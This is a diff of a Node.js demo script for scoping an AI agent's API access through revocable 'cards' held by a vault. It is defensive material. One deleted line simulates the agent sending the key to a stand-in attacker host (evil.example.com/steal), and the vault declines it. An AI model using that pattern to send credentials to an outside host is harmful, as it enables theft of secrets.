@@ -1,10 +1,11 @@
 #!/usr/bin/env node
 // Fort Card — a 2-minute demo of "issue credentials like CREDIT CARDS, not keys."
 //
-// The idea: a robot/agent should NEVER hold your real API key. It holds a CARD — a useless
-// pointer that's locked to ONE website, capped to N uses, and freezable with one tap. The
-// VAULT holds the real key and makes the call on the card's behalf, returning only the
-// result. Steal the card → you get nothing. Steal the key → you're wiped out. We use cards.
+// The idea: a robot/agent works with a CARD, not your real API key. The card is a pointer
+// that's scoped to specific hosts, capped to N uses, and freezable with one tap. The VAULT
+// holds the real key and makes the call on the card's behalf, returning only the result. A
+// card off in the wrong place is contained — wrong host or over its cap, it's declined, and
+// you freeze it or roll the key over in the wallet. That's why we use cards.
 //
 // Runs on plain Node 18+ (no install, no Cloudflare account). Bring your own API token.
 //
@@ -75,24 +76,24 @@ if (!TOKEN) {
 }
 const p = (s) => console.log(s);
 
-p("\n🔐 1. Lock the real key in the vault (encrypted). Nothing outside the vault ever sees it again.");
+p("\n🔐 1. Lock the real key in the vault (encrypted). The vault uses it; it doesn't hand it back out.");
 await storeSecret("my-key", TOKEN);
 
 p(`💳 2. Issue a CARD — locked to ${ALLOWED_HOST}, max 3 uses, freezable. THIS is all the robot gets:`);
 const card = issueCard({ name: "demo card", secret: "my-key", allowedHosts: [ALLOWED_HOST], limit: 3, headerScheme: SCHEME });
-p(`      ${card}   ← hand this to the agent, never the key`);
+p(`      ${card}   ← hand this to the agent, not the key`);
 
 p("\n🤖 3. The agent (holding ONLY the card id) makes a real authenticated call:");
 const r1 = await useCard(card, { url: TEST_URL });
 p(`      → authorized:${r1.authorized}  status:${r1.status}  ${JSON.stringify(r1.card)}`);
 p(`      real response (trimmed): ${JSON.stringify(r1.body).slice(0, 200)}`);
 
-p("\n🚫 4. The agent tries to send your key somewhere ELSE (theft / exfil attempt):");
-p(`      → ${JSON.stringify(await useCard(card, { url: "https://evil.example.com/steal" }))}`);
+p("\n🚫 4. The agent tries to use the card against a host it isn't scoped for:");
+p(`      → ${JSON.stringify(await useCard(card, { url: "https://unapproved.example.com/whatever" }))}`);
 
 p("\n🧊 5. You FREEZE the card; the agent tries again:");
 freezeCard(card, true);
 p(`      → ${JSON.stringify(await useCard(card, { url: TEST_URL }))}`);
 
-p("\n✅ The agent made a real call and NEVER saw the key. Theft and the frozen card were both declined.");
+p("\n✅ The agent made a real call without holding the key. The off-scope host and the frozen card were both declined.");
 p("   That's a credit card, not a key. The whole point in one screen.\n");
